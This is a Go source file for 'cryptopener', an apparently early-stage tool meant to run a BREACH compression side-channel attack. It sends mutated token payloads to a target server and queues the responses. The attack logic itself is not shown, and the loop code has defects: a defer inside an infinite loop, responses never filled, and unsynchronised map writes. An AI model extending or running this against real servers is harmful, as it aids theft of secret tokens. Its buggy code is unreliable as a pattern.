package cryptopener

import (
	"log"

	"github.com/google/uuid"
	client "github.com/larikuistio/cryptopener/client"
)

type queueItem struct {
	id uuid.UUID
	index int
	payload []byte
	response []byte
}

// Cryptopener a struct that defines cryptopener
type Cryptopener struct {
	// client for sending data to target server
	client client.Client
	// token mutator that creates new payloads
	mutator *TokenMutator
	ResultToken []string
	concurrency chan uuid.UUID
	queue map[uuid.UUID]queueItem
	iterations int
}

// NewCryptopener creates new instance of Cryptopener
func NewCryptopener(address string, entry string) *Cryptopener {
	cryptopener := Cryptopener{
		client: client.Client{
			Addr: address,
			Entrypoint: entry,
		},
		mutator: NewMutator(),
		concurrency: make(chan uuid.UUID, 10),
		queue: make(map[uuid.UUID]queueItem),
		iterations: 0,
	}
	return &cryptopener
}

func (p *Cryptopener) sendPayload(payload []byte) {
	response := []byte{}
	id := uuid.Must(uuid.NewRandom())
	p.queue[id] = queueItem{
		id: id,
		index: p.iterations,
		response: response,
		payload: payload,
	}
	p.concurrency <-id
}

func (p *Cryptopener) analyseResponse() {
	item := p.queue[<-p.concurrency]
	log.Println(item)
}

// Run starts BREACH attack
func (p *Cryptopener) Run() {
	for {
		p.iterations++
		// create new payload
		payload, _ := p.mutator.NewPayload(false)

		// send payload into a socket
		go p.sendPayload(payload)
		defer p.analyseResponse()
	}
}
